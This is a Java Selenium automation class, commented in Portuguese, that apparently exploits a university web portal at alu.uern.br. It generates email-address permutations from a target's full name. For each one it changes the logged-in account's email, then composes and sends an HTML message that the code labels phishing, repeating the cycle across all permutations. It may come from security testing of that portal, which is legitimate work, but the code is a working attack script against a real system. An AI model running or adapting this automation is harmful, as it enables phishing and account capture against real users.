package Pages;

import org.openqa.selenium.Keys;

import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import static Locators.Capturando_Contas_Locators.*;
import static Locators.Useful_Constants_Locators.*;

public class CapturandoContasPage extends UsefulConstants {
    LoginPage LoginPageObject =  new LoginPage();

    // Método para calcular as permutações possíveis de e-mails
    public static List<String> gerarEmails(String nomeCompleto) {
        String[] nomes = nomeCompleto.split(" "); // Divide o nome completo em partes (por espaço)
        List<String> emails = new ArrayList<>();

        // Gera todas as combinações possíveis de dois nomes sucessivos
        for (int i = 0; i < nomes.length - 1; i++) {
            for (int j = i + 1; j < nomes.length; j++) {
                // Cria a permutação com o i-ésimo nome e o j-ésimo nome
                String email = (nomes[i] + nomes[j]).toLowerCase() + "@alu.uern.br";
                emails.add(email);
            }
        }

        return emails;
    }

    public void MudardePopup(){
        // Obtém a Janela original
        String originalWindow = Xerxes.getWindowHandle();
        Set<String> allWindows = Xerxes.getWindowHandles();

        // Troca para o popup seguinte
        for (String windowHandle : allWindows) {
            if (!windowHandle.equals(originalWindow)) {
                Xerxes.switchTo().window(windowHandle);
                break;
            }
        }
    }

    public void CapturarContas() throws InterruptedException {
        int i = 1;

        List<String> emails = gerarEmails(DESTINATARIO_PHISHING);


        //Altera o e-mail atual para cada uma das permutações possíveis e realiza o fluxo de teste de enviar a mensagem de phishing
        for (String email : emails) {
            System.out.println(i + "º permutação: " + email);

            LoginPageObject.fazerLogin();

            ClicoNoElemento(ALTERAR_SENHA);

            MudardePopup();

            //Limpa o campo do e-mail
            EsperoEstarVisivel(CAMPO_EMAIL).clear();

            Envio_O_Dado(CAMPO_EMAIL, email);
            ClicoNoElemento(BOTAO_ALTERAR_DADOS);
            ClicoNoElemento(BOTAO_FECHAR);

            UsefulConstants.close();
            Thread.sleep(500);
            UsefulConstants.start();

            LoginPageObject.fazerLogin();

            ClicoNoElemento(MENSAGEM_PHISHING);
            ClicoNoElemento(ENVIAR_MENSAGEM);
            EsperoEstarVisivel(CAMPO_DESTINATARIO).sendKeys(NOME_USUARIO_TESTE);
            Thread.sleep(1500);
            EsperoEstarVisivel(CAMPO_DESTINATARIO).sendKeys(Keys.ARROW_DOWN, Keys.ENTER);
            Envio_O_Dado(CAMPO_TEXTO_ASSUNTO, TEXTO_ASSUNTO);
            ClicoNoElemento(OPCAO_HTML);
            MudardePopup();
            Envio_O_Dado(POPUP_HTML, TEXTO_MENSAGEM);
            ClicoNoElemento(BOTAO_ATUALIZAR_HTML);
            MudardePopup();
            ClicoNoElemento(BOTAO_ENVIAR_PHISHING);
            VerificoUrl(URL_MENSAGEM_ENVIADA);
            ClicarBotaoSair();
            i++;
        }
    }
}